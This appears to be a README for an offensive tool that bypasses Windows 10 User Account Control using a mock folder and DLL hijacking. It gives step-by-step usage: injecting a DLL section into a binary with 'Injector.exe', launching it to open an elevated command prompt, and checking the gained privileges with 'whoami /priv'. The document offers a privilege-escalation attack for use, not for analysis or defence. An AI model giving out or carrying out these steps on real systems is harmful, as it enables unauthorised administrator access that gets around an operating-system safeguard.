# Bypassing Windows 10 with mock folder and DLL Hijacking  
## Auto

**Steps**
1. Inject the DLL into the binary
2. Start the binary will open cmd in UAC privilege!

In the cmd go to the folder that "Injector.exe" is inside.
Type the command:

```cmd
Injector.exe <.SectioName> <Binary_path> <DLL_path>
```

For Example:
```cmd
Injector.exe .DLL BypassUAC.exe DLL_BypassUAC.dll
```
To check if the section is injected successfully you can open the binary in "CFF Explorer" software.

Start the binary!

To check if its works type in the new cmd that now opened:
```cmd
whoami /priv
```

https://user-images.githubusercontent.com/52316309/174519967-9735dbe0-f91d-4b82-83da-dfeb7bb5c6e7.mp4

**Links**

CFF Explorer:
https://ntcore.com/?page_id=388
